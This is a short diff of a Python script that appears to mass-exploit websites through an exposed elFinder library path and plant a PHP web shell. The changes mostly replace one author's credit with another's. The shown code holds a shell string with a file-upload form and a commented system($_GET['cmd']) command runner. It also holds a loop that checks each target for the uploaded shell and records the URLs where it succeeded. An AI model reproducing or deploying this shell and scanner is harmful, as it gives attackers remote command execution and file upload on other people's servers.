@@ -9,10 +9,10 @@ try:
 except IOError:
     pass
 woh = list((woh))
-print("Coded By Kro0oz #https://github.com/kro0oz ")
-#shell = """<?php echo "Kro0oz </br>"; $cmd = $_GET['cmd']; system($cmd);?>"""
+print("Coded By 0xr2r #https://github.com/0xr2r ")
+#shell = """<?php echo "0xr2r </br>"; $cmd = $_GET['cmd']; system($cmd);?>"""
 shell = """<?php 
-echo "By Kro0oz #https://github.com/kro0oz"." ".hex2bin("")."<br>";
+echo "By 0xr2r #https://github.com/0xr2r"." ".hex2bin("")."<br>";
 echo '<form method="post" enctype="multipart/form-data"><input type="file" name="___upload" /><input type="submit" name="_upl" /></form>';
 if(isset($_POST['_upl'])){
     if(copy($_FILES['___upload']['tmp_name'],$_FILES['___upload']['name'])){
@@ -33,7 +33,7 @@ def git_response(url):
 		checks = requests.get(url +"/sites/all/libraries/elfinder/files/upkrz.php")
 		if '' in checks.content:
 			print("[Target] {} Success ").format(url)
-			open('Suc_shell.txt', 'a').write(url +"/sites/all/libraries/elfinder/files/upkrz.php\n")
+			open('Suc_shell.txt', 'a').write(url +"/sites/all/libraries/elfinder/files/0xr2r.php\n")
 		else:
 			print("[Target]: {} Failed  ").format(url)
 		
